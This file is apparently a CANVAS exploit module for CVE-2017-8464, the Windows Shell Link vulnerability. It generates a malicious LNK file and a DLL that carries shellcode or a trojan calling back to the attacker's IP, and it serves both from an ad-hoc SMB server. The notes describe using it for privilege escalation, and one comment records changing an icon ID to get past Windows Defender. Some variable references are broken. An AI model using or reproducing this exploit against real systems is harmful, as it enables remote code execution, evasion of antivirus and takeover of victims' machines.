#! /usr/bin/env python

# Proprietary CANVAS source code - use only under the license agreement
# specified in LICENSE.txt in your CANVAS distribution
# Copyright Immunity, Inc, 2010
# http://www.immunityinc.com/CANVAS/ for more information

import sys
if "." not in sys.path:
    sys.path.append(".")

from random import randint
from random import choice
from string import ascii_uppercase
from string import ascii_lowercase
from string import digits
from struct import pack

from exploitutils import *
from tcpexploit import *
from httpclientside import *
from libs.spkproxy import header, body
from urlparse import urlparse

from libs.canvasos import *

from MOSDEF.pelib import PElib
import canvasengine

from engine.config import canvas_root_directory

# For setting up a canvas SMB server
import socket as sock
import libs.newsmb.libsmb as libsmb
from libs.daveutil import dmkdir


NAME                            = "special_lnk"
DESCRIPTION                     = "CVE-2017-8464 - Windows Shell Link Vulnerability"

DOCUMENTATION                   = {}
DOCUMENTATION["VENDOR"]         = "Microsoft"
DOCUMENTATION['Date public']    = '06/27/2017'
DOCUMENTATION['CVE Name']       = 'CVE-2017-8464'
DOCUMENTATION['CVE Url']        = 'https://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2017-8464'
DOCUMENTATION['CVSS']           = 7.5
DOCUMENTATION['References']     = ["https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2017-8464",
                                   "http://paper.seebug.org/357/",
                                   "http://www.vxjump.net/files/vuln_analysis/cve-2017-8464.txt"]

VERSION                         = '1.0'

PROPERTY                        = {}
PROPERTY['TYPE']                = 'Exploit'
PROPERTY['SITE']                = 'Clientside'
PROPERTY['ARCH']                = [['Windows']]
PROPERTY['VERSION']             = ['10']

DOCUMENTATION["NOTES"]          = """
**DIALOG BOX**
In the dialog box, both remote and local paths can be specified in such a way
that the LNK and DLL-based callback can be hosted by Canvas. To make Canvas
put the correct IP in for your own system, start the SMB path with \\HOSTLOCAL.
Other names than HOSTLOCAL can be entered as well, but HOSTLOCAL will be replaced
with the IP that your callback is listening on.

Should you want to create the LNK and DLL for distribution via other means, using
disk-paths such as C:\users\\target\callback.dll will work.

**NOTE** : To reiterate: an LNK path starting with \\HOSTLOCAL will tell the
module to host the LNK itself. If you do not want this to happen, simply specify
an on-disk path.

Tested on:
- Windows 10 (64 bit) with (local + remote) DLL path
- Windows 8 (32 bit) with local DLL path
- Windows 7 (32 bit) with (local + remote) DLL path

**HIGHLY IMPORTANT NOTE**
In our testing, we have discovered that this exploit is not just a clientside.
On multiple Windows 10 x64 systems we have noticed that in certain repeatable
circumstances, SearchProtocolHost.exe, a SYSTEM-privileged process, will
render the LNK. This behavior has not been observed on Windows 7 or Windows 8.

**In order to use this exploit as an LPE, just rename the original LNK after
you have a shell**

We have observed in our labs that using a UNC path that maps to a WebDAV share
is incredibly slow regardless of the software behind the share. For this reason
we recommend the use of an SMB share for remote/clientside exploitation where
delivery of only the LNK is possible.

Special thanks to Haifei Li and VXJump for their analysis.
"""

CHANGELOG = """
"""

targets = {
    0 : ["N/A", None, 0],
    1 : ["Windows", "en-us", 0],
}

class theexploit(httpclientside):
    def __init__(self):
        httpclientside.__init__(self)

        self.setInfo(DESCRIPTION)

        self.version = 0
        self.name = NAME

        self.is_running = False
        return

    def getargs(self):
        self.load_dll_path = self.argsDict.get("load_dll_path", None)
        self.local_dll_path = self.argsDict.get("local_dll_path", None)
        self.local_lnk_path = self.argsDict.get("local_lnk_path", None)
        self.arch = "x86" if self.argsDict.get("arch", 1) == 0 else "x64"
        self.run_smb = self.argsDict.get("run_smb", False)

        logging.debug(str(self.argsDict))
        logging.debug("local_dll_path:" + str(self.local_dll_path))
        logging.debug("local_lnk_path:" + str(self.local_lnk_path))
        logging.debug("load_dll_path:" + str(self.load_dll_path))
        logging.debug("run_smb:" + str(self.run_smb))
        logging.debug("arch:" + str(self.arch))

    def run_smb_server(self, smb_shares):
        # We cannot use MOSDEF sockets with this
        s = sock.socket(sock.AF_INET, sock.SOCK_STREAM)
        s.setsockopt(sock.SOL_SOCKET, sock.SO_REUSEADDR, 1)

        server = libsmb.SMBServer(s)
        for (share_path, local_path) in smb_shares.iteritems():
            logging.info("added share %s (maps to %s)" % (share_path, local_path))
            server.add_share(share_path, local_path)

        try:
            server.listen()

            while self.state != self.HALT:
                # logging.info("checking for halt")
                try:
                    while (server.accept() == True) and (self.state != self.HALT):
                        logging.info("Serving client request")
                except libsmb.SMBServerException as h:
                    if "timed out" in str(h):
                        pass
                    else:
                        raise
                except:
                    raise
        except Exception as e:
            print e
        logging.info("Shutting down SMB server")
        server.shutdown()

    def run(self):
        self.getargs()

        smb_paths = {'IPC$':None}

        if not self.run_smb:
            if self.load_dll_path is None:
                logging.error("Missing DLL path to be loaded from the LNK")
                return
            elif self.local_dll_path is None:
                logging.error("Missing output path for the injected DLL")
                return
            elif self.local_lnk_path is None:
                logging.error("Missing output path for the evil LNK")
                return
        else:
            if self.run_smb:
                if self.load_dll_path is None:
                    dll_folder = random.Random().sample(string.lowercase, 6)
                    dll_file = random.Random().sample(string.lowercase, 6) + ".cpl"
                    self.load_dll_path = "\\\\%s\\%s\\%s" % ("HOSTLOCAL", smb_folder, dll_file)

                if self.load_dll_path.startswith("\\\\HOSTLOCAL"):
                    self.load_dll_path = self.load_dll_path.replace("HOSTLOCAL", self.callback.ip)
                    parts = self.load_dll_path.split("\\")
                    if len(parts[2]) == 0:
                        logging.error("Remote DLL load path is not valid")
                        return 0

                    base_path = os.path.join(canvas_root_directory, os.path.dirname(__file__), "Resources")
                    components = self.load_dll_path.split("\\")
                    store_path = os.path.join(base_path, *components[3:-1])
                    dmkdir(store_path)
                    smb_remote_root = components[3]
                    smb_local_root = os.path.abspath(os.path.join(base_path, components[3]))

                    logging.info("Hosting DLL in ad-hoc SMB server (%s)" % self.local_dll_path)

                    self.local_dll_path = os.path.join(store_path, components[-1])

                    smb_paths[unicode(smb_remote_root.upper())] = unicode(smb_local_root)


                if self.local_lnk_path is None:
                    dll_folder = random.Random().sample(string.lowercase, 6)
                    dll_file = random.Random().sample(string.lowercase, 6) + ".lnk"
                    self.load_lnk_path = "\\\\%s\\%s\\%s" % ("HOSTLOCAL", smb_folder, dll_file)


                if self.local_lnk_path.startswith("\\\\HOSTLOCAL"):
                    self.local_lnk_path = self.local_lnk_path.replace("HOSTLOCAL", self.callback.ip)
                    parts = self.load_dll_path.split("\\")
                    if len(parts[2]) == 0:
                        logging.error("Remote DLL load path is not valid")
                        return 0

                    base_path = os.path.join(canvas_root_directory, os.path.dirname(__file__), "Resources")
                    components = self.local_lnk_path.split("\\")
                    store_path = os.path.join(base_path, *components[3:-1])
                    dmkdir(store_path)
                    smb_remote_root = components[3]
                    smb_local_root = os.path.abspath(os.path.join(base_path, components[3]))

                    logging.info("Hosting LNK in ad-hoc SMB server. Make target open: " + self.local_lnk_path)

                    self.local_lnk_path = os.path.join(store_path, components[-1])
                    smb_paths[unicode(smb_remote_root.upper())] = unicode(smb_local_root)


        with open(self.local_dll_path, "wb") as handle:
            handle.write(self.create_dll_file(0 if self.arch == "x86" else 1))
        with open(self.local_lnk_path, "wb") as handle:
            handle.write(self.create_link_file(os.path.basename(self.local_lnk_path), self.load_dll_path))

        logging.info("Starting the SMB server")
        if self.run_smb:
            self.run_smb_server(smb_paths)

        logging.warning("SMB server started")

    def createShellcode(self):
        class ShellcodeHelper(shellcodeGenerator.win32):
            """
            Derives from our previous one, but has our cleanup code in it.
            """
            def __init__(self):
                shellcodeGenerator.win32.__init__(self)
                self.handlers["lnk_cleanup"] = self.lnk_cleanup
                self.vProtectSelf = False

            def lnk_cleanup(self, args):
                self.code += """
                    movl $0xff0, %ebx
                    movl %fs:4(%ebx), %esp
                    popad
                    xorl %eax, %eax
                    ret
                """

        payload = self.createWin32ClientSideShellcode()

        # Here we use a shellcode with a custom exit stub
        sc = ShellcodeHelper()
        sc.vProtectSelf = True
        sc.addAttr("findeipnoesp", {"subespval": 0x1000})
        sc.addAttr("InjectToSelf", { "injectme" : payload, "DONTEXIT" : True})
        sc.addAttr("lnk_cleanup", None)

        mutex = mosdef.assemble("""
        pushad
        movl $0xff0, %ebx
        movl %fs:0(%ebx), %eax
        test %eax, %eax
        jz lnk_payload

        lnk_exit:
        popad
        xorl %eax, %eax
        ret

        lnk_payload:
        // if reason == 1 then do payload
        // we use 40 because we have 32 bytes from the pushad and 8(%esp)
        // is the second arg
        movl 40(%esp), %eax
        cmpl $1, %eax
        jnz lnk_exit

        // Set the mutex to 1
        movl $1, %fs:0(%ebx)
        movl %esp, %fs:4(%ebx)
        """, "x86")

        self.shellcode = mutex + sc.get()

        if len(self.shellcode) % 4:
            self.shellcode += "\x90" * (4 - (len(self.shellcode) % 4))

        logging.debug("LNK - Length of shellcode: %d" % len(self.shellcode))

        return self.shellcode

    def create_dll_file(self, win64=0):
        pelib = PElib(win64=win64)

        # Create the dll in memory
        shellcode = None
        buffer = None
        if not win64:
            shellcode = self.createShellcode()
            buffer = pelib.createPEFileBuf({"DllMain" : shellcode}, gui=False)
            return buffer
        else:
            tos = canvasos("Windows")
            tos.arch = 'x64'
            text = self.buildmosdeftrojan(self.callback.ip,
                                          self.callback.port,
                                          target_os=tos,
                                          universal=True,
                                          encrypted=False,
                                          dll=True,
                                          win8_compatible=True)
            return self.mosdeftrojan

    def create_link_file(self, filename, dll_path):
        ShellLinkHeader = ""
        ShellLinkHeader += struct.pack("<I", 0x4C) #HeaderSize
        ShellLinkHeader += struct.pack("<IIII", 0x21401, 0x00, 0xC0, 0x46000000) #LinkCLSID
        ShellLinkHeader += struct.pack("<I", 0x81) #LinkFlags
        ShellLinkHeader += struct.pack("<I", 0x00) #FileAttributes
        ShellLinkHeader += struct.pack("<Q", 0x00) #CreationTime
        ShellLinkHeader += struct.pack("<Q", 0x00) #AccessTime
        ShellLinkHeader += struct.pack("<Q", 0x00) #WriteTime
        ShellLinkHeader += struct.pack("<I", 0x00) #FileSize
        ShellLinkHeader += struct.pack("<I", 0x00) #IconIndex   ###############
        ShellLinkHeader += struct.pack("<I", 0x00) #ShowCommand
        ShellLinkHeader += struct.pack("<H", 0x00) #HotKey
        ShellLinkHeader += struct.pack("<H", 0x00) #Reserved1
        ShellLinkHeader += struct.pack("<I", 0x00) #Reserved2
        ShellLinkHeader += struct.pack("<I", 0x00) #Reserved3


        ItemID_0 = ""
        ItemID_0 += struct.pack("<H", 0x14) #ItemIDSize
        ItemID_0 += struct.pack("<B", 0x1F) #Type
        ItemID_0 += struct.pack("<B", 0x00) #Unknown
        ItemID_0 += struct.pack("<IIII", 0x20D04FE0, 0x10693AEA, 0x08D8A2, 0x9D30302B) #GUID

        ItemID_1 = ""
        ItemID_1 += struct.pack("<H", 0x14) #ItemIDSize
        ItemID_1 += struct.pack("<B", 0x2E) #Type
        ItemID_1 += struct.pack("<B", 0x1E) #Unknown
        ItemID_1 += struct.pack("<IIII", 0x21EC2020, 0x10693AEA, 0x08DDA2, 0x9D30302B) #GUID

        ItemID_2 = ""
        #ItemID_2 += struct.pack("<H", 0x) #ItemIDSize
        ItemID_2 += struct.pack("<H", 0x00) #Unknown
        # NN: this one gets flagged by Windows Defender
        # ItemID_2 += struct.pack("<I", 0x00) #iconID
        # NN: let's see if this other icon id passes?
        ItemID_2 += struct.pack("<I", 0xfffffda6) #iconID
        ItemID_2 += struct.pack("<H", 0x00) #offsetToStr1
        ItemID_2 += struct.pack("<H", 0x00) #offsetToStr2
        ItemID_2 += struct.pack("<I", 0x00006A00) #moduleName (equal to this to activate Unicode)
        ItemID_2 += struct.pack("<H", 0x00) #Unknown
        ItemID_2 += struct.pack("<H", 0x00) #WoWFlags
        ItemID_2 += struct.pack("<H", 0x00) #offsetToUnicodeStr1
        ItemID_2 += struct.pack("<H", 0x00) #offsetToUnicodeStr2

        path = dll_path

        ItemID_2 += path.encode("utf-16")[2:] + struct.pack("<H", 0x00) #moduleNameUnicode
        ItemID_2 = struct.pack("<H", len(ItemID_2)+2) + ItemID_2

        LinkTargetIDList = ""
        LinkTargetIDList +=	struct.pack("<H", len(ItemID_0 + ItemID_1 + ItemID_2) + 2) #IDListSize
        LinkTargetIDList += ItemID_0
        LinkTargetIDList += ItemID_1
        LinkTargetIDList += ItemID_2
        LinkTargetIDList += struct.pack("<H", 0x00) #TerminalID

        ExtraData = ""
        # SpecialFolderDataBlock
        ExtraData += struct.pack("<L", 0x10) # BlockSize
        ExtraData += struct.pack("<L", 0xA0000005) # BlockSignature
        ExtraData += struct.pack("<L", 0x03) # SpecialFolderID
        ExtraData += struct.pack("<L", len(ItemID_0) + len(ItemID_1)) # Offset

        ExtraData += struct.pack("<I", 0x00) #TerminalBlock

        return ShellLinkHeader + LinkTargetIDList + ExtraData


# For running the exploit on the command line
if __name__ == "__main__":
    logging.info("Running CANVAS %s Exploit v %s" % (DESCRIPTION, VERSION))
    app = theexploit()
    ret = standard_callback_commandline(app)

    if ret not in [0, 1, None]:
        ret.interact()
